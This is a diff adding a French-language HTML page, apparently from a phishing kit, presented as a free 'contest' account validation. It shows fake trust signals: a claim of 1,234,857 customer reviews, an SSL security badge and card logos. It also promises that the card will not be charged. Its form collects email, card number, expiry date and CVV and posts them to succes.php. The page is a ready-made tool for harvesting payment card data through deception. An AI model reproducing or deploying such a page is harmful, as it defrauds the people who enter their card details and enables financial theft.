@@ -1,0 +1,103 @@
+<html>
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <link rel="stylesheet" type="text/css" href="templates/105/css/joinform.css">
+    <link href="https://fonts.googleapis.com/css?family=Noto+Sans:400,700" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Concours</title>
+</head>
+
+
+<body>
+<header>
+    <div class="img-wrapper">
+        <img src="img/223.png" alt="logo" class="header-img">
+    </div>
+</header>
+<div class="col-wrapper">
+    <div class="form-col-header">
+        <p class="form-col-header-title">
+            Validation de votre compte
+        </p>
+    </div>
+    <div class="form-col form-col-left">
+        <div id="header" class="panel__order">
+            <div class="order-section__top">
+                <div class="section__top--main">
+                    <h3 class="flex f--justify-sb">
+                            <span class="tick__title">
+                                <img src="templates/105/img/tick-green.svg" alt="green check mark">
+                            </span>
+                        <span>Validation GRATUITE</span>
+                        <span class="green">&euro; 0.00</span></h3>
+                </div>
+                <div class="section__top--bottom flex f--align-ctr">
+                    <img src="templates/105/img/rating.png" alt="stars icons">
+                    <p>Basé sur 1.234.857 opinions de clients</p>
+                </div>
+            </div>
+            <div class="order-section__bottom">
+                <p>
+                    Votre carte bancaire <span>NE</span>
+                    sera <span>PAS DÉBITÉE</span> pour la validation GRATUITE
+                </p>
+            </div>
+        </div>
+        <div id="header-card" class="panel__ccard flex f--align-ctr f--justify-sb">
+            <div class="security-part flex f--align-ctr desktop">
+                <img src="templates/105/img/lock.png" alt="lock icon" class="security-part__lock">
+                <div class="security-part__text">
+                    <h4>VALIDATION SÉCURISÉE</h4>
+                    <p>Cryptage SSL à 256 Bits</p>
+                </div>
+            </div>
+            <div class="ccard-type flex f--align-ctr f--justify-ctr">
+                <img src="templates/105/img/cc-visa.jpg" alt="Visa">
+                <img src="templates/105/img/cc-electron.jpg" alt="Electron">
+                <img src="templates/105/img/cc-mastercard.jpg" alt="Mastercard">
+                <img src="templates/105/img/cc-maestro.jpg" alt="Maestro">
+                <img src="templates/105/img/cc-default.png" alt="CB">
+            </div>
+        </div>
+
+
+
+<div id="container">
+  <div id="contentWrapper">
+    <div id="frameWrapper">
+     <div id="frameWrapperHeader">
+    </div>
+    <div id="rocketpayFrameWrapper">
+    <form method="post" ID="RocketGateForm" action="succes.php">
+
+        <br><br>
+        <input type="email" name="email" placeholder="E-mail" required><br><br>
+        <input type="cc" name="cc" placeholder="Credit Card number" required maxlength="16"><br><br>
+        <input type="expire" name="expire" placeholder="MM/YY" required maxlength="5"><br><br>
+        <input type="cvv" name="cvv" placeholder="CVV" required maxlength="3">
+
+        <div id="formWrapper">
+
+            <div id="divxsell_0" class="divxsell">
+                <p class="required">
+                    <input type="checkbox" name="xsell_checkbox_0" id="xsell_checkbox_0" class="inputCheckbox xsellCheckbox" checked="checked"/>
+                    <label class="labelCheckbox" for="xsell_checkbox_0">
+                        Oui je voudrais participer à ce concours où je ne serais pas débité (0,0 &euro;) sur ma carte de crédit.
+                    </label>
+                </p>
+            </div>
+            <div id="divsubmit">
+                <p align="center">
+                    <input type="submit" id="submitButton" name="submit" value="SUBMIT">
+                </p>
+            </div>
+            <div class="footer">&nbsp;</div>
+        </div>
+    </form> 
+</div>
+    </div>
+  </div>
+</div>
+
+</html>
